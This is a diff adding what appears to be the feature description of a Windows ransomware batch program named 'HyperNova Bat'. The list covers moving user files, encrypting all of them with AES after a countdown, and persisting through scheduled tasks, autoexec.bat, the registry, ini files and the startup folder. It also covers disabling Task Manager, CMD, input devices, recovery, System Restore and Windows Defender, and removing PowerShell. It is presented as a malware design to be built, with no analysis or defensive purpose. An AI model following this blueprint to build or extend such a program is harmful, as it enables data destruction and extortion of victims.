@@ -1,0 +1,66 @@
+﻿This Program will start by (mass moving files) from an assortment of 26 directories, which all end up
+on the desktop. Error handling has been issued to allow the program to continue it's course.
+
+At the end of the countdown, all the files of the current user will be encrypted with 256-bit AES.
+
+GPO override is issued, scheduling a task at the highest administrative level via; whoami /all. This will
+allow the program to launch at startup everytime.
+
+Registry Override: Numerous Disablement
+
+List of disabled features:
+
+*CMD
+*Task Manager
+*Hide Desktop
+*Hide TaskBar
+*Memory Hack
+
+ REM *Disables Recovery Options in windows
+    REM *Disable Startup Repair from trying to start when a problem is detected
+    REM *Disable Windows recovery at startup
+    REM *Adds to startup via multiple methods:
+    REM *Copy's itself into the autoexec.bat
+    REM *HAT method (Hooking Autoexec.bat)
+    REM *Registry
+    REM *System.ini
+    REM *Win.ini
+    REM *Startup folder
+    REM *Shell Spawning
+    REM *Disable Mouse & Keyboard
+
+    *HyperNova Bat: Features
+    REM Disable Pagefile - tunecomp.net/win10-page-file-disable
+            REM Disable Remote Desktop Connection - www.thewindowsclub.com/remote-desktop-connection-windows
+            REM Disable Security Accounts Manager service - services.msc
+            REM Disable Turning Off HDD - http://www.thewindowsclub.com/prevent-hard-drive-going-sleep-windows
+            REM You need to take ownership of the file/folder beforehand - youtube.com/watch?v=x7gjZMvQHu4
+            REM tenforums.com/tutorials/3841-take-ownership-add-context-menu-windows-10-a.html but you still need to 
+            REM You might still need to Allow user Full Control - Properties - Security - Edit - Select User (or Add, if missing) - Select Allow Full Control
+            REM %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+            REM:  TAKING FULL OWNERSHIP 
+            REM:  Run As Admin
+            REM  Remove Network from Navigation Panel
+            REM  takes ownership of the registry
+            REM 1 -  Disable WER logging
+            REM 1 -  Disable WER crash dialogs, popups
+            REM 1 -  Disable WER sending second-level data
+            REM: 1 -  Disable Windows Error Reporting (WER)
+            REM: 1 -  Prevent device metadata retrieval from the Internet/ Do not automatically download manufacturers’ apps and custom icons available for your devices
+            REM:  Driver Kill
+            REM:  Hide User Files
+            REM:  Hide My Computer
+            REM:  Hide Recycle Bin
+            REM:  Hide Network
+            REM:  Hide Control Panel
+            REM:  Terminating Windows Defender
+            REM: Disable System Restore
+            REM: Take ownership of the registry
+            'Remove essential startup entries
+            'Remove Windows Powershell 
+            'Below copies bat to startup folder.
+            'Grant .bat Highest Permissions
+            REM: Remove various files, folders, startup entries and policies 
+            'Remove Cortana to get rid of SearchUI.exe 
+            'Remove Microsoft Synchronization Manager to prevent it from running at every startup 
+            REM:Removes Startup Folders
